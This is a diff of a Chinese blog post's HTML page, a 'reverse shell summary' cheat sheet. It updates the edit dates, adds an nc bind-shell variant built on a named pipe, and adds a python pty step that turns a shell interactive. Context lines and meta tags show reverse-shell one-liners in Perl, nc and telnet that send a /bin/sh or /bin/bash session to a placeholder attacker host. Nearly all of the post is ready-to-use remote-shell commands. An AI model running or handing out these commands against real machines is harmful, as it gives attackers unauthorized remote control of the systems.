@@ -104,7 +104,7 @@
 <meta property="og:site_name" content="Windylh&#39;s blog">
 <meta property="og:description" content="攻击机监听1nc -lvvp 7777 靶机远程反弹shellPerl123perl -e &apos;use Socket;$i=&quot;x.x.x.x&quot;;$p=xxxx;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&amp;#123;open(STDIN,&quot;&amp;gt;&amp;am">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-11-01T10:53:03.245Z">
+<meta property="og:updated_time" content="2020-03-09T09:06:53.463Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="反弹shell小结">
 <meta name="twitter:description" content="攻击机监听1nc -lvvp 7777 靶机远程反弹shellPerl123perl -e &apos;use Socket;$i=&quot;x.x.x.x&quot;;$p=xxxx;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&amp;#123;open(STDIN,&quot;&amp;gt;&amp;am">
@@ -367,7 +367,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2018-11-01 18:53:03" itemprop="dateModified" datetime="2018-11-01T18:53:03+08:00">2018-11-01</time>
+                <time title="Modified: 2020-03-09 17:06:53" itemprop="dateModified" datetime="2020-03-09T17:06:53+08:00">2020-03-09</time>
               
             
           </span>
@@ -422,8 +422,11 @@
 <h4 id="nc"><a href="#nc" class="headerlink" title="nc"></a>nc</h4><p>支持-e<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -e /bin/sh x.x.x.x xxxx</span><br></pre></td></tr></table></figure></p>
 <p>不支持-e<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc x.x.x.x 12345 &gt;/tmp/f</span><br></pre></td></tr></table></figure></p>
 <h4 id="telnet"><a href="#telnet" class="headerlink" title="telnet"></a>telnet</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rm -f /tmp/p; mknod /tmp/p p &amp;&amp; telnet x.x.x.x 12345 0&lt;/tmp/p | /bin/bash 1&gt;/tmp/p</span><br></pre></td></tr></table></figure>
-<h3 id="正向链接"><a href="#正向链接" class="headerlink" title="正向链接"></a>正向链接</h3><p>靶机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p xxxx -e /bin/bash</span><br></pre></td></tr></table></figure></p>
+<h3 id="正向链接"><a href="#正向链接" class="headerlink" title="正向链接"></a>正向链接</h3><p>靶机</p>
+<p>支持-e<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -l -p xxxx -e /bin/bash</span><br></pre></td></tr></table></figure></p>
+<p>不支持-e<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mkfifo /tmp/tmp_fifo</span><br><span class="line">cat /tmp/tmp_fifo | /bin/sh -i 2&gt;&amp;1 | nc -l xxxx &gt; /tmp/tmp_fifo</span><br></pre></td></tr></table></figure></p>
 <p>攻击机<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc x.x.x.x xxxx</span><br></pre></td></tr></table></figure></p>
+<h3 id="通过python变为交互式shell"><a href="#通过python变为交互式shell" class="headerlink" title="通过python变为交互式shell"></a>通过python变为交互式shell</h3><p>交互式shell与非交互式shell：简单说就是执行两个命令打开了几个终端，如果是只打开了一个终端就是交互式，否则就是非交互式；<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -c &apos;import pty; pty.spawn(&quot;/bin/bash&quot;)&apos;</span><br></pre></td></tr></table></figure></p>
 
       
     </div>
@@ -701,7 +704,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击机监听"><span class="nav-number">1.</span> <span class="nav-text">攻击机监听</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#靶机远程反弹shell"><span class="nav-number">2.</span> <span class="nav-text">靶机远程反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Perl"><span class="nav-number">2.1.</span> <span class="nav-text">Perl</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php"><span class="nav-number">2.2.</span> <span class="nav-text">php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#python"><span class="nav-number">2.3.</span> <span class="nav-text">python</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Java"><span class="nav-number">2.4.</span> <span class="nav-text">Java</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bash"><span class="nav-number">2.5.</span> <span class="nav-text">bash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nc"><span class="nav-number">2.6.</span> <span class="nav-text">nc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#telnet"><span class="nav-number">2.7.</span> <span class="nav-text">telnet</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#正向链接"><span class="nav-number">3.</span> <span class="nav-text">正向链接</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#攻击机监听"><span class="nav-number">1.</span> <span class="nav-text">攻击机监听</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#靶机远程反弹shell"><span class="nav-number">2.</span> <span class="nav-text">靶机远程反弹shell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Perl"><span class="nav-number">2.1.</span> <span class="nav-text">Perl</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#php"><span class="nav-number">2.2.</span> <span class="nav-text">php</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#python"><span class="nav-number">2.3.</span> <span class="nav-text">python</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Java"><span class="nav-number">2.4.</span> <span class="nav-text">Java</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#bash"><span class="nav-number">2.5.</span> <span class="nav-text">bash</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#nc"><span class="nav-number">2.6.</span> <span class="nav-text">nc</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#telnet"><span class="nav-number">2.7.</span> <span class="nav-text">telnet</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#正向链接"><span class="nav-number">3.</span> <span class="nav-text">正向链接</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#通过python变为交互式shell"><span class="nav-number">4.</span> <span class="nav-text">通过python变为交互式shell</span></a></li></ol></div>
             
 
           </div>
